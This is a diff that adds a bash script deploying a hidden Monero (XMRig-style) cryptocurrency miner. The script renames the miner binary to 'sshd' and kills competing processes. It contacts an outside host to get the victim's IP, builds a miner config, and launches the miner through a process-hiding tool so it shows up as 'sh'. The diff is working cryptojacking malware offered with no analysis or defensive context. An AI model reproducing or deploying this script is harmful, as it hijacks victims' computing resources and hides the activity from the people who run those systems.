@@ -1,0 +1,37 @@
+#!/bin/bash
+cp -f .cnrig sshd
+cp -f .h64 h64
+chmod +x *
+IP=`curl http://bookaires.com/feed/remote/rinfo.php`
+nrandom=$((1 + RANDOM % 100000))
+ps x | grep -v grep | grep sh | grep Ssl | awk {'print $1'} | while read -r p; do [[ $p ]] && kill "$p"; done
+if [[ $(nproc) != 1 ]]; then
+        echo "Bigger $(nproc) cores"
+        awk '{gsub("workx", "miner'$nrandom'");print}' .config.json.big > config.json
+        if [ ! -f config.json ]; then
+                cp -f .config.json.big config.json
+        fi
+else
+        echo "Smaller $(nproc) cores"
+        awk '{gsub("workx", "miner'$nrandom'");print}' .config.json.big > config.json
+        if [ ! -f config.json ]; then
+                cp -f .config.json config.json
+        fi
+fi
+
+if      [ -z "$IP" ];   then
+        IP="localhost"
+else
+        class=$(echo "$IP" | cut -f 1,2 -d .)
+        IP="$class.XM.Rig"
+fi
+HIDE="sh"
+if [ ! -f .xmr.pid ];   then
+#	./.t -s sh ./sshd -t $(nproc)
+        ./h64 -s $HIDE ./sshd -t $(nproc)
+        touch .xmr.pid
+else
+#	./.t -s sh ./sshd -t $(nproc)
+        ./h64 -s $HIDE ./sshd -t $(nproc) & echo $(( $! + 1 )) > .xmr.pid
+fi
+
